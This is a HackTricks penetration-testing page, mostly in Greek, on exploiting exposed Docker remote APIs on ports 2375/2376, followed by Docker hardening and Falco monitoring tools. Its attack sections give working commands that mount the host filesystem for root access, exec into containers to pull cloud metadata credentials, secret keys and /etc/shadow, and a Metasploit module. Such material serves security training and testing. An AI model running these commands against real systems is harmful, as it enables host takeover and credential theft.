# 2375, 2376 Pentesting Docker

{{#include ../banners/hacktricks-training.md}}

### Docker Basics

#### What is

Το Docker είναι η **πρωτοποριακή πλατφόρμα** στη **βιομηχανία κοντέινερ**, η οποία ηγείται της **συνεχούς καινοτομίας**. Διευκολύνει τη χωρίς κόπο δημιουργία και διανομή εφαρμογών, που κυμαίνονται από **παραδοσιακές έως μελλοντικές**, και διασφαλίζει την **ασφαλή ανάπτυξή** τους σε διάφορα περιβάλλοντα.

#### Basic docker architecture

- [**containerd**](http://containerd.io): Αυτή είναι μια **βασική εκτέλεση** για κοντέινερ, υπεύθυνη για τη συνολική **διαχείριση του κύκλου ζωής ενός κοντέινερ**. Αυτό περιλαμβάνει τη διαχείριση της **μεταφοράς και αποθήκευσης εικόνας**, καθώς και την επίβλεψη της **εκτέλεσης, παρακολούθησης και δικτύωσης** των κοντέινερ. **Περισσότερες λεπτομέρειες** σχετικά με το containerd **εξετάζονται περαιτέρω**.
- Ο **container-shim** παίζει κρίσιμο ρόλο ως **μεσάζων** στη διαχείριση των **headless κοντέινερ**, αναλαμβάνοντας ομαλά από το **runc** μετά την αρχικοποίηση των κοντέινερ.
- [**runc**](http://runc.io): Εκτιμάται για τις **ελαφριές και καθολικές δυνατότητες εκτέλεσης κοντέινερ**, το runc είναι ευθυγραμμισμένο με το **πρότυπο OCI**. Χρησιμοποιείται από το containerd για να **ξεκινά και να διαχειρίζεται κοντέινερ** σύμφωνα με τις **κατευθυντήριες γραμμές OCI**, έχοντας εξελιχθεί από το αρχικό **libcontainer**.
- [**grpc**](http://www.grpc.io) είναι απαραίτητο για **να διευκολύνει την επικοινωνία** μεταξύ του containerd και του **docker-engine**, διασφαλίζοντας **αποτελεσματική αλληλεπίδραση**.
- Ο [**OCI**](https://www.opencontainers.org) είναι καθοριστικός για τη διατήρηση των **προδιαγραφών OCI** για εκτέλεση και εικόνες, με τις τελευταίες εκδόσεις του Docker να είναι **συμβατές με τα πρότυπα εικόνας και εκτέλεσης OCI**.

#### Basic commands
```bash
docker version #Get version of docker client, API, engine, containerd, runc, docker-init
docker info #Get more infomarion about docker settings
docker pull registry:5000/alpine #Download the image
docker inspect <containerid> #Get info of the contaienr
docker network ls #List network info
docker exec -it <containerid> /bin/sh #Get shell inside a container
docker commit <cotainerid> registry:5000/name-container #Update container
docker export -o alpine.tar <containerid> #Export container as tar file
docker save -o ubuntu.tar <image> #Export an image
docker ps -a #List running and stopped containers
docker stop <containedID> #Stop running container
docker rm <containerID> #Remove container ID
docker image ls #List images
docker rmi <imgeID> #Remove image
docker system prune -a
#This will remove:
#  - all stopped containers
#  - all networks not used by at least one container
#  - all images without at least one container associated to them
#  - all build cache
```
#### Containerd

**Containerd** αναπτύχθηκε ειδικά για να εξυπηρετήσει τις ανάγκες πλατφορμών κοντέινερ όπως **Docker και Kubernetes**, μεταξύ άλλων. Σκοπός του είναι να **απλοποιήσει την εκτέλεση κοντέινερ** σε διάφορα λειτουργικά συστήματα, συμπεριλαμβανομένων των Linux, Windows, Solaris και άλλων, απομονώνοντας τη λειτουργικότητα και τις κλήσεις συστήματος που σχετίζονται με το λειτουργικό σύστημα. Ο στόχος του Containerd είναι να περιλαμβάνει μόνο τα απαραίτητα χαρακτηριστικά που απαιτούν οι χρήστες του, προσπαθώντας να παραλείψει περιττά στοιχεία. Ωστόσο, η πλήρης επίτευξη αυτού του στόχου αναγνωρίζεται ως προκλητική.

Μια βασική σχεδιαστική απόφαση είναι ότι **το Containerd δεν διαχειρίζεται το δίκτυο**. Το δίκτυο θεωρείται κρίσιμο στοιχείο σε κατανεμημένα συστήματα, με πολυπλοκότητες όπως το Software Defined Networking (SDN) και την ανακάλυψη υπηρεσιών που διαφέρουν σημαντικά από πλατφόρμα σε πλατφόρμα. Επομένως, το Containerd αφήνει τις πτυχές του δικτύου να διαχειρίζονται από τις πλατφόρμες που υποστηρίζει.

Ενώ **το Docker χρησιμοποιεί το Containerd** για να εκτελεί κοντέινερ, είναι σημαντικό να σημειωθεί ότι το Containerd υποστηρίζει μόνο ένα υποσύνολο των λειτουργιών του Docker. Συγκεκριμένα, το Containerd στερείται των δυνατοτήτων διαχείρισης δικτύου που υπάρχουν στο Docker και δεν υποστηρίζει τη δημιουργία Docker swarms άμεσα. Αυτή η διάκριση τονίζει το επικεντρωμένο ρόλο του Containerd ως περιβάλλον εκτέλεσης κοντέινερ, αναθέτοντας πιο εξειδικευμένες λειτουργίες στις πλατφόρμες με τις οποίες ενσωματώνεται.
```bash
#Containerd CLI
ctr images pull --skip-verify --plain-http registry:5000/alpine:latest #Get image
ctr images list #List images
ctr container create registry:5000/alpine:latest alpine #Create container called alpine
ctr container list #List containers
ctr container info <containerName> #Get container info
ctr task start <containerName> #You are given a shell inside of it
ctr task list #Get status of containers
ctr tasks attach <containerName> #Get shell in running container
ctr task pause <containerName> #Stop container
ctr tasks resume <containerName> #Resume cotainer
ctr task kill -s SIGKILL <containerName> #Stop running container
ctr container delete <containerName>
```
#### Podman

**Podman** είναι μια ανοιχτού κώδικα μηχανή κοντέινερ που συμμορφώνεται με τα [Open Container Initiative (OCI) standards](https://github.com/opencontainers), αναπτυγμένη και συντηρούμενη από την Red Hat. Ξεχωρίζει από το Docker με αρκετά χαρακτηριστικά, κυρίως την **αρχιτεκτονική χωρίς daemon** και την υποστήριξη για **rootless containers**, επιτρέποντας στους χρήστες να εκτελούν κοντέινερ χωρίς δικαιώματα root.

Το Podman έχει σχεδιαστεί για να είναι συμβατό με το API του Docker, επιτρέποντας τη χρήση εντολών Docker CLI. Αυτή η συμβατότητα επεκτείνεται στο οικοσύστημα του, το οποίο περιλαμβάνει εργαλεία όπως το **Buildah** για την κατασκευή εικόνων κοντέινερ και το **Skopeo** για λειτουργίες εικόνας όπως push, pull και inspect. Περισσότερες λεπτομέρειες για αυτά τα εργαλεία μπορείτε να βρείτε στη [σελίδα GitHub τους](https://github.com/containers/buildah/tree/master/docs/containertools).

**Κύριες Διαφορές**

- **Αρχιτεκτονική**: Σε αντίθεση με το μοντέλο client-server του Docker με έναν background daemon, το Podman λειτουργεί χωρίς daemon. Αυτός ο σχεδιασμός σημαίνει ότι τα κοντέινερ εκτελούνται με τα δικαιώματα του χρήστη που τα ξεκινά, ενισχύοντας την ασφάλεια με την εξάλειψη της ανάγκης για πρόσβαση root.
- **Ενσωμάτωση με Systemd**: Το Podman ενσωματώνεται με το **systemd** για τη διαχείριση κοντέινερ, επιτρέποντας τη διαχείριση κοντέινερ μέσω μονάδων systemd. Αυτό αντιτίθεται στη χρήση του systemd από το Docker κυρίως για τη διαχείριση της διαδικασίας daemon του Docker.
- **Rootless Containers**: Ένα κρίσιμο χαρακτηριστικό του Podman είναι η ικανότητά του να εκτελεί κοντέινερ υπό τα δικαιώματα του χρήστη που τα ξεκινά. Αυτή η προσέγγιση ελαχιστοποιεί τους κινδύνους που σχετίζονται με παραβιάσεις κοντέινερ, διασφαλίζοντας ότι οι επιτιθέμενοι αποκτούν μόνο τα δικαιώματα του παραβιασμένου χρήστη, όχι πρόσβαση root.

Η προσέγγιση του Podman προσφέρει μια ασφαλή και ευέλικτη εναλλακτική λύση στο Docker, τονίζοντας τη διαχείριση δικαιωμάτων χρηστών και τη συμβατότητα με τις υπάρχουσες ροές εργασίας του Docker.

> [!NOTE]
> Σημειώστε ότι καθώς το podman στοχεύει να υποστηρίξει το ίδιο API με το docker, μπορείτε να χρησιμοποιήσετε τις ίδιες εντολές με το podman όπως με το docker, όπως:
>
> ```bash
> podman --version
> podman info
> pdoman images ls
> podman ls
> ```

### Βασικές Πληροφορίες

Η απομακρυσμένη API εκτελείται από προεπιλογή στην θύρα 2375 όταν είναι ενεργοποιημένη. Η υπηρεσία από προεπιλογή δεν θα απαιτεί αυθεντικοποίηση, επιτρέποντας σε έναν επιτιθέμενο να ξεκινήσει ένα προνομιακό κοντέινερ docker. Χρησιμοποιώντας την απομακρυσμένη API, μπορεί κανείς να συνδέσει hosts / (ριζικό κατάλογο) στο κοντέινερ και να διαβάσει/γράψει αρχεία του περιβάλλοντος του host.

**Προεπιλεγμένη θύρα:** 2375
```
PORT    STATE SERVICE
2375/tcp open  docker
```
### Enumeration

#### Manual

Σημειώστε ότι για να καταμετρήσετε το docker API μπορείτε να χρησιμοποιήσετε την εντολή `docker` ή `curl` όπως στο παρακάτω παράδειγμα:
```bash
#Using curl
curl -s http://open.docker.socket:2375/version | jq #Get version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"19.03.1","Details":{"ApiVersion":"1.40","Arch":"amd64","BuildTime":"2019-07-25T21:19:41.000000000+00:00","Experimental":"false","GitCommit":"74b1e89","GoVersion":"go1.12.5","KernelVersion":"5.0.0-20-generic","MinAPIVersion":"1.12","Os":"linux"}},{"Name":"containerd","Version":"1.2.6","Details":{"GitCommit":"894b81a4b802e4eb2a91d1ce216b8817763c29fb"}},{"Name":"runc","Version":"1.0.0-rc8","Details":{"GitCommit":"425e105d5a03fabd737a126ad93d62a9eeede87f"}},{"Name":"docker-init","Version":"0.18.0","Details":{"GitCommit":"fec3683"}}],"Version":"19.03.1","ApiVersion":"1.40","MinAPIVersion":"1.12","GitCommit":"74b1e89","GoVersion":"go1.12.5","Os":"linux","Arch":"amd64","KernelVersion":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
Αν μπορείτε να **επικοινωνήσετε με το απομακρυσμένο docker API με την εντολή `docker`** μπορείτε να **εκτελέσετε** οποιαδήποτε από τις **εντολές docker** [**που έχουν σχολιαστεί προηγουμένως**](2375-pentesting-docker.md#basic-commands) για να αλληλεπιδράσετε με την υπηρεσία.

> [!NOTE]
> Μπορείτε να `export DOCKER_HOST="tcp://localhost:2375"` και να **αποφύγετε** τη χρήση της παραμέτρου `-H` με την εντολή docker

**Γρήγορη κλιμάκωση προνομίων**
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
**Curl**

Μερικές φορές θα δείτε το **2376** ενεργό για το **TLS** endpoint. Δεν μπόρεσα να συνδεθώ σε αυτό με τον docker client, αλλά είναι δυνατόν να το κάνετε με το curl.
```bash
#List containers
curl –insecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl –insecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s –insecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl –insecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, it’s also worth checking out services in case they are adding secrets via environment variables)
curl -s –insecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl –insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
Αν θέλετε περισσότερες πληροφορίες σχετικά με αυτό, περισσότερες πληροφορίες είναι διαθέσιμες από όπου αντέγραψα τις εντολές: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

#### Αυτόματη
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
### Συμβιβασμός

Στην παρακάτω σελίδα μπορείτε να βρείτε τρόπους για **να ξεφύγετε από ένα docker container**:

{{#ref}}
../linux-hardening/privilege-escalation/docker-security/
{{#endref}}

Καταχρώντας αυτό, είναι δυνατόν να ξεφύγετε από ένα container, μπορείτε να εκτελέσετε ένα αδύναμο container στη απομακρυσμένη μηχανή, να ξεφύγετε από αυτό και να συμβιβάσετε τη μηχανή:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

### Ανάβαση Δικαιωμάτων

Αν βρίσκεστε σε έναν υπολογιστή που χρησιμοποιεί docker, μπορείτε [**να διαβάσετε αυτές τις πληροφορίες για να προσπαθήσετε να ανυψώσετε τα δικαιώματα**](../linux-hardening/privilege-escalation/index.html#writable-docker-socket).

### Ανακάλυψη μυστικών σε εκτελούμενα κοντέινερ Docker
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
Ελέγξτε **env** (ενότητα μεταβλητών περιβάλλοντος) για μυστικά και μπορεί να βρείτε:

- Κωδικούς πρόσβασης.
- Διευθύνσεις IP.
- Θύρες.
- Διαδρομές.
- Άλλα… .

Αν θέλετε να εξάγετε ένα αρχείο:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
### Ασφαλίζοντας το Docker

#### Ασφαλίζοντας την εγκατάσταση και τη χρήση του Docker

- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) για να ελέγξετε την τρέχουσα εγκατάσταση του docker.
- `./docker-bench-security.sh`
- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/kost/dockscan](https://github.com/kost/dockscan) για να ελέγξετε την τρέχουσα εγκατάσταση του docker.
- `dockscan -v unix:///var/run/docker.sock`
- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) για να δείτε τα δικαιώματα που θα έχει ένα κοντέινερ όταν εκτελείται με διαφορετικές επιλογές ασφαλείας. Αυτό είναι χρήσιμο για να γνωρίζετε τις επιπτώσεις της χρήσης ορισμένων επιλογών ασφαλείας για την εκτέλεση ενός κοντέινερ:
- `docker run --rm -it r.j3ss.co/amicontained`
- `docker run --rm -it --pid host r.j3ss.co/amicontained`
- `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

#### Ασφαλίζοντας τις εικόνες Docker

- Μπορείτε να χρησιμοποιήσετε μια εικόνα docker από [https://github.com/quay/clair](https://github.com/quay/clair) για να σαρώσετε τις άλλες εικόνες docker σας και να βρείτε ευπάθειες.
- `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
- `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

#### Ασφαλίζοντας τα Dockerfiles

- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) για να **ελέγξετε το Dockerfile σας** και να βρείτε κάθε είδους κακή διαμόρφωση. Κάθε κακή διαμόρφωση θα έχει ένα ID, μπορείτε να βρείτε εδώ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) πώς να διορθώσετε καθεμία από αυτές.
- `dockerfilelinter -f Dockerfile`

![](<../images/image (176).png>)

- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) για να **ελέγξετε το Dockerfile σας** και να βρείτε κάθε είδους κακή διαμόρφωση.
- `dockerfilelint Dockerfile`

![](<../images/image (212).png>)

- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) για να **ελέγξετε το Dockerfile σας** και να βρείτε κάθε είδους κακή διαμόρφωση.
- `dockerlint Dockerfile`

![](<../images/image (71).png>)

- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) για να **ελέγξετε το Dockerfile σας** και να βρείτε κάθε είδους κακή διαμόρφωση.
- `hadolint Dockerfile`

![](<../images/image (501).png>)

#### Καταγραφή ύποπτης δραστηριότητας

- Μπορείτε να χρησιμοποιήσετε το εργαλείο [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) για να ανιχνεύσετε **ύποπτη συμπεριφορά σε εκτελούμενα κοντέινερ**.
- Σημειώστε στο παρακάτω κομμάτι πώς **το Falco συντάσσει ένα module πυρήνα και το εισάγει**. Μετά από αυτό, φορτώνει τους κανόνες και **ξεκινά την καταγραφή ύποπτων δραστηριοτήτων**. Σε αυτή την περίπτωση, έχει ανιχνεύσει 2 προνομιούχα κοντέινερ που ξεκίνησαν, 1 από αυτά με μια ευαίσθητη προσάρτηση, και μετά από μερικά δευτερόλεπτα ανίχνευσε πώς άνοιξε ένα shell μέσα σε ένα από τα κοντέινερ.
```bash
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
#### Παρακολούθηση Docker

Μπορείτε να χρησιμοποιήσετε το auditd για να παρακολουθήσετε το docker.

### Αναφορές

- [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
- [https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc](https://stackoverflow.com/questions/41645665/how-containerd-compares-to-runc)

{{#include ../banners/hacktricks-training.md}}
